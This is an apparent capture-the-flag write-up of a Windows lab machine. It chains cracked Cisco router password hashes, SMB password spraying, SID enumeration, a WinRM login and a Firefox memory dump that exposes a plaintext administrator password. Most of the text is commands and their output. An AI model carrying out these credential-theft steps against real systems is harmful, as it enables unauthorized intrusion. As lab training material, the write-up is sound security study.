1,Recon
port scan
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-18T14:05:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
Page check
![](images/Pasted%20image%2020241218090858.png)
There is a login page, but we did not have any valid credit.
To be honest, I can also find the login button is not working and it would not redirect us to the other pages or give us any error messages.
But we can get something interesting from `login as guest`
![](images/Pasted%20image%2020241218091101.png)
There is a attachments here
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

In the Cisco config, there are 3 different hashes of two different types, each of which are described in this paper:
```
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91	Cisco Type 5
salted md5

username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
Cisco Type 7
Custom, reversible
```

The type 5 password can be decrypted with john:
```
root@kali# /opt/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt level5_hash                                                                                                      
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 256/256 AVX2 8x3])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
1g 0:00:00:15 DONE (2019-08-20 19:54) 0.06631g/s 232443p/s 232443c/s 232443C/s steaua17..steall3
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

There are online tools to crack type 7 hashes
http://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html

Then we can get `$uperP@ssword` and `Q4)sJu\Y8qz*A3?d`

I’ve got a list of three passwords, and a list of three user names:
```
root@kali# cat passwords 
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
root@kali# cat users 
rout3r
admin
hazard
```

port 445
I would want to check what is going on here
```
smbclient -L //10.10.10.149
Password for [WORKGROUP\wither]:
session setup failed: NT_STATUS_ACCESS_DENIED

But the guest account could not access.

I would use the before passwords and usernames to crack them.

crackmapexec smb 10.10.10.149 -u usernames -p passwords

SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
```

Then we get the result `SupportDesk\hazard:stealth1agent`

Let's come to smbmap and smbclient here and  I’ll also try to connect over WinRM with these creds, but it fails.
```
smbmap -H 10.10.10.149 -u hazard -p stealth1agent
Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

IPC$ is a share used for interprocess communications. Typically IPC$ is known for accecpting null (unauthenticated) sessions, but in this case, I needed credentials to read from it.

As I can read IPC$, I can connect with rpcclient:
```
root@kali# rpcclient -U 'hazard%stealth1agent' 10.10.10.149
rpcclient $> 
```
I can also look up accounts by SID:
```
 rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)

```

There’s an impacket tool, lookupsids.py, which does this faster and cleaner:
```
root@kali# lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

 I took these new user names and my list of passwords, and I used Evil-WinRM to try connecting as each with different passwords. When I got to chase / ‘Q4)sJu\Y8qz*A3?d’, it connected:
 ```
evil-winrm -i 10.10.10.149 -u SUPPORTDESK\\chase -p 'Q4)sJu\Y8qz*A3?d'
```

There is a todo.txt from the desktop of user chase
```
type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.

```

How would chase check the issues list? With a browser. I’ll also notice that multiple instances of firefox are in the process list:
```
get-process firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    355      25    16444      39108       0.09   4584   1 firefox
   1160      69   135360     211264       4.44   6444   1 firefox
    347      20    10188      38756       0.05   6556   1 firefox
    401      34    31348      90168       0.55   6708   1 firefox
    378      28    21840      58496       0.28   7020   1 firefox
```

I’ll grab procdump64.exe from the sysinternals tools page, and upload it to Heist:
Now I’ll run it on one of the pids for firefox from above:
```
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6252 -accepteula

ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[02:54:30] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_190823_025430.dmp
[02:54:30] Dump 1 writing: Estimated dump file size is 280 MB.
[02:54:32] Dump 1 complete: 281 MB written in 2.1 seconds
[02:54:33] Dump count reached.
```

Now I’ll look for any POST requests in memory using grep and the format I found above:
```
root@kali# grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_190823_025430.dmp 
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```
I’ve got a password there. I can check, and it does match the hash from the source code:
```
 echo -n '4dD!5}x/re8]FBuZ' | sha256sum 
91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040  -
```

Then we can use evil-winrm to connect it
```
evil-winrm -i 10.10.10.149 -u SUPPORTDESK\\administrator -p '4dD!5}x/re8]FBuZ'
```